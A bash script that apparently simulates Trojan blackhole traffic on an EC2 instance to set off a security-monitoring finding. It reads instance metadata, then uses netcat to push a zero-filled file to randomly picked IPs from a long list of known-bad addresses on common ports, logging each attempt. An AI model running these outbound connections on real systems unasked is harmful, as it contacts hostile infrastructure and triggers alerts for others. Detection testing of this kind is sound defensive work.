############################################################
#create autoscaling group
# this section is done through the console
############################################################
# get s3 bucket name to write outputs to
#if [[ "$1" != "" ]]; then
#    DIR="$1"
#else
#    echo "no s3 bucket name given to write to\n"
#    exit 0
#fi
#get instaceid
EC2_INSTANCE_ID="`wget -q -O - http://169.254.169.254/latest/meta-data/instance-id || die \"wget instance-id has failed: $?\"`"
test -n "$EC2_INSTANCE_ID" || die 'cannot obtain instance-id'
#get availability zone
EC2_AVAIL_ZONE="`wget -q -O - http://169.254.169.254/latest/meta-data/placement/availability-zone || die \"wget availability-zone has failed: $?\"`"
test -n "$EC2_AVAIL_ZONE" || die 'cannot obtain availability-zone'
#get region
EC2_REGION="`echo \"$EC2_AVAIL_ZONE\" | sed -e 's:\([0-9][0-9]*\)[a-z]*\$:\\1:'`"
#start script
startTime=`date +%s`
echo "start Runtime: " $startTime >>  /home/ec2-user/attackOutputs/$startTime-Trojan-EC2_BlackHoleTraffic_$EC2_INSTANCE_ID.txt
#generate non trival sized file
dd if=/dev/zero of=zero.dat bs=1k count=4
############################################################
#send traffic to bad IP
loops=$((1 + RANDOM % 10))
for (( i=1; i<=$loops; i++ ))
do
    BADIP=(199.2.137.109 199.2.137.174 207.46.90.132 173.231.184.59 95.211.172.143 195.22.26.204 199.2.137.212 199.2.137.236 199.2.137.0 207.46.90.58 207.46.90.4 195.22.26.250 199.2.137.142 58.158.177.102 207.46.90.9 195.22.26.196 199.2.137.198 199.2.137.213 144.217.254.92 9.9.9.9 195.22.4.21 199.2.137.25 199.2.137.218 64.95.103.184 212.61.180.100 64.95.103.189 173.231.184.52 199.2.137.184 87.255.51.229 173.231.184.62 95.211.174.92 199.2.137.29 207.46.90.109 63.251.126.4 207.46.90.200 173.231.184.61 195.22.26.206 195.22.26.232 207.46.90.240 64.95.103.188 193.166.255.171 195.22.26.208 199.2.137.173 199.2.137.177 207.46.90.67 199.2.137.110 148.81.111.121 91.134.203.113 199.2.137.199 207.46.90.236 199.2.137.48 207.46.90.14 192.42.119.41 207.46.90.131 199.2.137.22 199.2.137.32 64.95.103.180 208.100.26.234 199.2.137.28 157.230.5.146 207.46.90.181 207.46.90.49 199.2.137.221 64.95.103.187 199.2.137.24 199.2.137.201 207.46.90.175 173.231.184.60 195.22.26.231 199.2.137.244 199.2.137.245 207.46.90.96 63.251.126.7 199.2.137.203 207.46.90.115 207.46.90.121 207.46.90.229 199.2.137.27 199.2.137.233 207.46.90.208 207.46.90.0 207.46.90.153 63.251.126.10 195.38.137.100 144.217.254.3 195.22.28.194 64.95.103.186 173.231.184.55 173.231.184.56 173.231.184.58 195.157.15.100 199.2.137.193 207.46.90.91 139.59.250.183 199.2.137.73 207.46.90.223 63.251.126.9 64.95.103.181 199.2.137.20 199.2.137.6 199.2.137.21 166.78.144.80 195.22.26.195 192.42.116.41 195.22.26.253 199.2.137.132 173.231.184.54 207.46.90.117 199.2.137.16 195.22.26.218 148.81.111.122 64.95.103.182 64.95.103.183 64.95.103.185 176.31.62.76 166.78.145.90 195.22.26.252 199.2.137.195 208.100.26.251 207.46.90.61 207.46.90.94 199.2.137.106 173.231.184.57 207.46.90.32 199.2.137.26 199.2.137.166 207.46.90.170 207.46.90.224 45.77.226.209 199.2.137.165 207.46.90.248 195.22.26.254 207.46.90.216 50.62.12.103 195.22.26.248 195.22.26.217)
    #BADIP=(87.76.29.65) #just the known bad IP to fire it
    BADPORTS=(22 23 25 50 52 53 80 81 82 83 84 85 86 87 88 96 110 135 139 185 222 372 389)
    #BADPORTS=(80 21 22 443 3389) #just the known bad ports to fire it
    sizeIP=${#BADIP[@]}
    sizePort=${#BADPORTS[@]}
    indexIP=$(($RANDOM % $sizeIP))
    indexPort=$(($RANDOM % $sizePort))
    #use bad port and a random collection of other ports
    nc -vv ${BADIP[$indexIP]} ${BADPORTS[$indexPort]} < zero.dat
    echo ${BADIP[$indexIP]} ${BADPORTS[$indexPort]} >>  /home/ec2-user/attackOutputs/$startTime-Trojan-EC2_BlackHoleTraffic_$EC2_INSTANCE_ID.txt
done
############################################################
#track times that I did this activity
end=`date +%s`
echo "end Runtime: " $end >>  /home/ec2-user/attackOutputs/$startTime-Trojan-EC2_BlackHoleTraffic_$EC2_INSTANCE_ID.txt
############################################################
#move files to a3 bucket
#aws s3 cp  /home/ec2-user/attackOutputs/$startTime-Trojan-EC2_BlackHoleTraffic_$EC2_INSTANCE_ID.txt s3://$DIR